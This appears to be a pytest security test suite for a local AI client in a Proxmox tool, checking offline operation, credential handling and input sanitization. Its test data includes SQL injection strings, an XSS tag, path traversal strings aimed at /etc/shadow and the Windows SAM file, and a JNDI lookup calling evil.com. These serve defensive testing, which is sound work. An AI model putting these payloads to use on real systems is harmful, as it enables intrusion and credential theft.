"""
Security Validation Test Suite for Local AI System.

Validates zero cloud dependencies, credential management, 
and security compliance for the local AI implementation.
"""

import pytest
import os
import re
import json
import tempfile
import subprocess
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import inspect

from src.proxmox_ai.ai.local_ai_client import OptimizedLocalAIClient
from src.proxmox_ai.core.hardware_detector import hardware_detector
from src.proxmox_ai.core.model_manager import EfficientModelManager
from src.proxmox_ai.core.security import CredentialManager
from src.proxmox_ai.core.config import get_settings


class TestZeroCloudDependencies:
    """Test that local AI system has zero cloud API dependencies."""
    
    def test_no_external_api_endpoints(self):
        """Test that no external API endpoints are hardcoded."""
        client = OptimizedLocalAIClient()
        
        # Verify only local endpoints
        assert client.ollama_host.startswith("http://localhost") or \
               client.ollama_host.startswith("http://127.0.0.1"), \
               f"External endpoint detected: {client.ollama_host}"
        
        # Check for any external URLs in configuration
        config_str = str(client.hardware_config)
        external_patterns = [
            r'https?://(?!localhost|127\.0\.0\.1)',
            r'api\.anthropic\.com',
            r'openai\.com',
            r'huggingface\.co/api'
        ]
        
        for pattern in external_patterns:
            assert not re.search(pattern, config_str), \
                   f"External API endpoint found: {pattern}"
    
    def test_no_api_key_requirements(self):
        """Test that local AI works without API keys."""
        client = OptimizedLocalAIClient()
        
        # Should initialize without requiring API keys
        assert hasattr(client, 'model_name')
        assert hasattr(client, 'hardware_config')
        
        # Verify model info retrieval works without credentials
        model_info = client.get_model_info()
        assert "current_model" in model_info
        assert "recommended_model" in model_info
    
    def test_offline_capability(self):
        """Test that system can work in offline mode."""
        # Mock network unavailability
        with patch('requests.get', side_effect=Exception("Network unreachable")):
            # Hardware detection should still work
            specs = hardware_detector.specs
            assert specs.total_memory_gb > 0
            assert specs.cpu_cores > 0
            
            # Model manager should handle offline mode
            manager = EfficientModelManager()
            recommendations = manager.get_model_recommendations()
            assert isinstance(recommendations, list)
    
    def test_no_telemetry_or_tracking(self):
        """Test that no telemetry or tracking is present."""
        client = OptimizedLocalAIClient()
        
        # Check for telemetry-related attributes/methods
        telemetry_indicators = [
            'analytics', 'telemetry', 'tracking', 'metrics_endpoint',
            'usage_stats', 'phone_home', 'beacon'
        ]
        
        client_attrs = dir(client)
        for indicator in telemetry_indicators:
            matching_attrs = [attr for attr in client_attrs if indicator in attr.lower()]
            assert len(matching_attrs) == 0, \
                   f"Potential telemetry found: {matching_attrs}"
    
    def test_local_model_storage_only(self):
        """Test that models are stored locally only."""
        manager = EfficientModelManager()
        
        # Verify model catalog references local models
        for model_name, model_info in manager.model_catalog.items():
            # Should not contain external URLs
            assert "http" not in model_name
            assert "://" not in model_name
            assert model_info.family in ["tinyllama", "deepseek-coder", "codellama", "phi", "mistral"]


class TestCredentialSecurity:
    """Test credential management and security."""
    
    def test_no_hardcoded_credentials(self):
        """Test that no credentials are hardcoded in the codebase."""
        # Get all Python files in the project
        src_path = Path("src/proxmox_ai")
        python_files = list(src_path.rglob("*.py"))
        
        # Patterns that might indicate hardcoded credentials
        credential_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
            r'auth\s*=\s*["\'][^"\']+["\']'
        ]
        
        for file_path in python_files:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                for pattern in credential_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    # Filter out obvious test/example values
                    filtered_matches = [m for m in matches if not any(
                        test_val in m.lower() for test_val in 
                        ['test', 'example', 'dummy', 'fake', 'placeholder', 'your_key_here']
                    )]
                    
                    assert len(filtered_matches) == 0, \
                           f"Potential hardcoded credential in {file_path}: {filtered_matches}"
            except Exception as e:
                pytest.skip(f"Could not read file {file_path}: {e}")
    
    def test_secure_credential_storage(self):
        """Test that credentials are stored securely."""
        try:
            credential_manager = CredentialManager()
            
            # Test credential operations
            test_key = "test_service"
            test_value = "test_credential"
            
            # Store credential
            credential_manager.store_credential(test_key, test_value)
            
            # Retrieve credential
            retrieved = credential_manager.get_credential(test_key)
            assert retrieved == test_value
            
            # Clean up
            credential_manager.delete_credential(test_key)
            
        except Exception as e:
            pytest.skip(f"Credential manager not available: {e}")
    
    def test_environment_variable_usage(self):
        """Test proper use of environment variables for configuration."""
        settings = get_settings()
        
        # Verify sensitive settings can be loaded from environment
        sensitive_fields = ['proxmox_password', 'anthropic_api_key']
        
        for field in sensitive_fields:
            # Should not have default values for sensitive fields
            if hasattr(settings.proxmox, 'password'):
                assert settings.proxmox.password != "default_password"
            if hasattr(settings.anthropic, 'api_key'):
                assert not settings.anthropic.api_key or len(settings.anthropic.api_key) > 10
    
    def test_no_credential_logging(self):
        """Test that credentials are not logged."""
        # Mock logging to capture log messages
        logged_messages = []
        
        def mock_log(*args, **kwargs):
            logged_messages.append(str(args) + str(kwargs))
        
        with patch('structlog.get_logger') as mock_logger:
            mock_logger.return_value.info = mock_log
            mock_logger.return_value.debug = mock_log
            mock_logger.return_value.warning = mock_log
            mock_logger.return_value.error = mock_log
            
            # Initialize client (this should trigger some logging)
            client = OptimizedLocalAIClient()
            
            # Check that no credential patterns appear in logs
            all_logs = ' '.join(logged_messages)
            credential_indicators = ['password', 'secret', 'token', 'key=']
            
            for indicator in credential_indicators:
                # Should not contain actual credential values
                assert not re.search(rf'{indicator}["\'][^"\']+["\']', all_logs, re.IGNORECASE)


class TestInputValidation:
    """Test input validation and sanitization."""
    
    @pytest.mark.asyncio
    async def test_prompt_sanitization(self):
        """Test that prompts are properly sanitized."""
        client = OptimizedLocalAIClient()
        
        # Test with potentially malicious inputs
        malicious_prompts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "\\x00\\x01\\x02",  # Null bytes
            "A" * 10000,  # Very long string
        ]
        
        for prompt in malicious_prompts:
            # Should handle without throwing exceptions
            try:
                cache_key = client._get_cache_key(prompt, "intermediate")
                assert isinstance(cache_key, str)
                assert len(cache_key) == 16
            except Exception as e:
                pytest.fail(f"Input sanitization failed for prompt: {prompt[:50]}... Error: {e}")
    
    def test_skill_level_validation(self):
        """Test skill level input validation."""
        client = OptimizedLocalAIClient()
        
        # Test valid skill levels
        valid_levels = ["beginner", "intermediate", "expert"]
        for level in valid_levels:
            config = client.skill_levels.get(level)
            assert config is not None
        
        # Test invalid skill level handling
        invalid_config = client.skill_levels.get("invalid_level", client.skill_levels["intermediate"])
        assert invalid_config == client.skill_levels["intermediate"]
    
    def test_configuration_validation(self):
        """Test configuration parameter validation."""
        # Test hardware detector validation
        assert hardware_detector.validate_model_compatibility("tinyllama:1.1b-chat-q4_0") in [True, False]
        
        # Test with invalid model names
        invalid_models = ["", "invalid_model", "model:invalid_format"]
        for model in invalid_models:
            try:
                result = hardware_detector.validate_model_compatibility(model)
                assert isinstance(result, bool)
            except Exception:
                # Should handle gracefully
                pass


class TestResourceSecurity:
    """Test resource usage and security limits."""
    
    def test_memory_limits(self):
        """Test that memory usage limits are enforced."""
        client = OptimizedLocalAIClient()
        
        # Verify memory constraints in configuration
        for skill_level, config in client.skill_levels.items():
            max_tokens = config["max_tokens"]
            
            # Should have reasonable limits
            assert max_tokens > 0
            assert max_tokens <= 8192, f"Token limit too high for {skill_level}: {max_tokens}"
        
        # Verify hardware-based limits
        hardware_config = client.hardware_config
        assert hardware_config["cpu_threads"] <= 8  # Reasonable CPU thread limit
        assert hardware_config["timeout"] <= 60  # Reasonable timeout
    
    def test_file_access_restrictions(self):
        """Test that file access is properly restricted."""
        client = OptimizedLocalAIClient()
        
        # Should not have methods that access arbitrary files
        dangerous_methods = ['open', 'read', 'write', 'execute', 'eval', 'exec']
        client_methods = [method for method in dir(client) if not method.startswith('_')]
        
        for method_name in client_methods:
            for dangerous in dangerous_methods:
                assert dangerous not in method_name.lower(), \
                       f"Potentially dangerous method: {method_name}"
    
    def test_network_access_restrictions(self):
        """Test that network access is restricted to local services."""
        client = OptimizedLocalAIClient()
        
        # Verify only local network access
        assert "localhost" in client.ollama_host or "127.0.0.1" in client.ollama_host
        
        # Should not have methods for arbitrary network access
        network_methods = ['urllib', 'requests', 'socket', 'http']
        client_attrs = dir(client)
        
        for attr in client_attrs:
            if not attr.startswith('_'):
                attr_value = getattr(client, attr, None)
                if callable(attr_value):
                    # Check method source doesn't contain arbitrary network calls
                    try:
                        source = inspect.getsource(attr_value)
                        # Should only connect to local services
                        if 'requests.' in source or 'urllib.' in source:
                            assert 'localhost' in source or '127.0.0.1' in source
                    except (OSError, TypeError):
                        # Can't get source, skip
                        pass
    
    def test_process_execution_restrictions(self):
        """Test that process execution is properly controlled."""
        # Model manager should only execute safe commands
        manager = EfficientModelManager()
        
        # Check that only whitelisted commands are used
        allowed_commands = ['ollama']
        
        # This is a basic check - in production you'd want more comprehensive validation
        assert hasattr(manager, '_download_model')


class TestDataPrivacy:
    """Test data privacy and information disclosure."""
    
    def test_no_data_persistence_without_consent(self):
        """Test that user data is not persisted without explicit consent."""
        client = OptimizedLocalAIClient()
        
        # Cache should be memory-only by default
        assert hasattr(client, 'context_cache')
        assert isinstance(client.context_cache, dict)
        
        # Should not automatically save prompts to disk
        temp_prompt = "test prompt for privacy"
        cache_key = client._get_cache_key(temp_prompt, "intermediate")
        
        # Check that no files are created with this content
        temp_dir = Path(tempfile.gettempdir())
        for temp_file in temp_dir.glob("*"):
            if temp_file.is_file():
                try:
                    with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        assert temp_prompt not in content, \
                               f"User prompt found in temp file: {temp_file}"
                except (PermissionError, FileNotFoundError):
                    # Can't read file, skip
                    pass
    
    def test_error_message_sanitization(self):
        """Test that error messages don't leak sensitive information."""
        client = OptimizedLocalAIClient()
        
        # Simulate various error conditions
        error_scenarios = [
            # Mock network error
            (patch('requests.post', side_effect=Exception("Connection failed to secret-server:8080")), 
             "should not contain server details"),
            
            # Mock file error  
            (patch('builtins.open', side_effect=PermissionError("/secret/path/file")),
             "should not contain file paths"),
        ]
        
        for mock_context, description in error_scenarios:
            with mock_context:
                try:
                    # This should trigger error handling
                    with patch.object(client, 'is_available', return_value=True):
                        # This will fail due to our mocked exceptions
                        pass
                except Exception as e:
                    error_msg = str(e)
                    # Error messages should not contain sensitive details
                    sensitive_patterns = ['/secret/', 'secret-server', 'password', 'token']
                    for pattern in sensitive_patterns:
                        assert pattern not in error_msg.lower(), \
                               f"Sensitive info in error message: {error_msg}"
    
    def test_cache_security(self):
        """Test that cache doesn't leak information between sessions."""
        client1 = OptimizedLocalAIClient()
        client2 = OptimizedLocalAIClient()
        
        # Add data to first client cache
        test_data = "sensitive information"
        client1._update_cache("test_key", test_data)
        
        # Second client should not see first client's cache
        cached_data = client2._check_cache("test_key")
        assert cached_data is None, "Cache leaked between instances"
        
        # Clear cache should work properly
        client1.clear_cache()
        assert len(client1.context_cache) == 0


class TestComplianceValidation:
    """Test compliance with security frameworks."""
    
    def test_cis_benchmark_alignment(self):
        """Test alignment with CIS benchmark principles."""
        settings = get_settings()
        
        # Test secure defaults
        assert settings.logging.level in ["INFO", "WARNING", "ERROR"]  # Not DEBUG by default
        
        # Test that sensitive operations require explicit configuration
        if hasattr(settings, 'debug'):
            # Debug mode should not be enabled in production
            if settings.environment == "production":
                assert not settings.debug
    
    def test_owasp_compliance(self):
        """Test OWASP security principles compliance."""
        client = OptimizedLocalAIClient()
        
        # Test input validation (A03:2021 – Injection)
        malicious_inputs = ["<script>", "'; DROP TABLE", "${jndi:"]
        for malicious_input in malicious_inputs:
            try:
                # Should handle without executing
                cache_key = client._get_cache_key(malicious_input, "intermediate")
                assert isinstance(cache_key, str)
            except Exception:
                # Should not crash
                pass
        
        # Test security logging (A09:2021 – Security Logging)
        # Verify that security-relevant events would be logged
        assert hasattr(client, '_make_optimized_request')  # Method exists for monitoring
    
    def test_gdpr_compliance_features(self):
        """Test GDPR compliance features."""
        client = OptimizedLocalAIClient()
        
        # Test data minimization
        perf_stats = client.get_performance_stats()
        # Should only collect necessary performance metrics
        expected_keys = {"total_requests", "cache_hits", "cache_hit_rate", 
                        "avg_processing_time", "model_name", "hardware_config"}
        actual_keys = set(perf_stats.keys())
        assert actual_keys == expected_keys, f"Unexpected data collection: {actual_keys - expected_keys}"
        
        # Test right to erasure (cache clearing)
        client._update_cache("test", "data")
        assert len(client.context_cache) > 0
        client.clear_cache()
        assert len(client.context_cache) == 0


class TestSecurityMonitoring:
    """Test security monitoring and alerting capabilities."""
    
    def test_resource_monitoring(self):
        """Test that resource usage is monitored for security."""
        usage = hardware_detector.monitor_resource_usage()
        
        # Should monitor key security-relevant metrics
        required_metrics = ["memory_used_percent", "cpu_usage_percent", "memory_available_gb"]
        for metric in required_metrics:
            assert metric in usage
            assert isinstance(usage[metric], (int, float))
            assert usage[metric] >= 0
    
    def test_performance_anomaly_detection(self):
        """Test basic performance anomaly detection."""
        client = OptimizedLocalAIClient()
        
        # Initialize with some baseline metrics
        initial_stats = client.get_performance_stats()
        assert initial_stats["total_requests"] == 0
        
        # After processing, stats should update appropriately
        client.request_count = 5
        client.total_processing_time = 10.0
        
        updated_stats = client.get_performance_stats()
        assert updated_stats["total_requests"] == 5
        assert updated_stats["avg_processing_time"] == 2.0
    
    def test_security_event_logging(self):
        """Test that security events are properly logged."""
        # This would be expanded with actual security event scenarios
        client = OptimizedLocalAIClient()
        
        # Verify logging infrastructure is available
        import structlog
        logger = structlog.get_logger(__name__)
        
        # Should be able to log security events
        assert hasattr(logger, 'info')
        assert hasattr(logger, 'warning')
        assert hasattr(logger, 'error')


class TestVulnerabilityMitigation:
    """Test mitigation of common vulnerabilities."""
    
    def test_injection_attack_prevention(self):
        """Test prevention of injection attacks."""
        client = OptimizedLocalAIClient()
        
        # Test SQL injection patterns
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; SELECT * FROM secrets;"
        ]
        
        for injection in sql_injections:
            # Should sanitize without executing
            sanitized_key = client._get_cache_key(injection, "intermediate")
            assert isinstance(sanitized_key, str)
            assert len(sanitized_key) == 16  # MD5 hash length
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        # Test that file paths in prompts don't cause issues
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        client = OptimizedLocalAIClient()
        for path in path_traversals:
            # Should handle without accessing the paths
            try:
                cache_key = client._get_cache_key(path, "intermediate")
                assert isinstance(cache_key, str)
            except Exception as e:
                # Should not fail due to path traversal attempt
                assert "permission" not in str(e).lower()
                assert "access" not in str(e).lower()
    
    def test_denial_of_service_prevention(self):
        """Test prevention of DoS attacks."""
        client = OptimizedLocalAIClient()
        
        # Test very large inputs
        large_input = "A" * 100000  # 100KB string
        
        # Should handle large inputs gracefully
        try:
            cache_key = client._get_cache_key(large_input, "intermediate")
            assert isinstance(cache_key, str)
            assert len(cache_key) == 16
        except Exception as e:
            # Should not crash the system
            assert "memory" not in str(e).lower()
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        client = OptimizedLocalAIClient()
        
        # Cache key generation should take similar time regardless of input
        import time
        
        inputs = ["short", "medium_length_input", "very_long_input_that_takes_more_processing_time"]
        times = []
        
        for input_str in inputs:
            start = time.perf_counter()
            client._get_cache_key(input_str, "intermediate")
            end = time.perf_counter()
            times.append(end - start)
        
        # Times should be relatively similar (within order of magnitude)
        max_time = max(times)
        min_time = min(times)
        
        # Should not vary by more than 10x (very loose check for timing resistance)
        assert max_time / min_time < 10, f"Potential timing attack vector: {times}"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])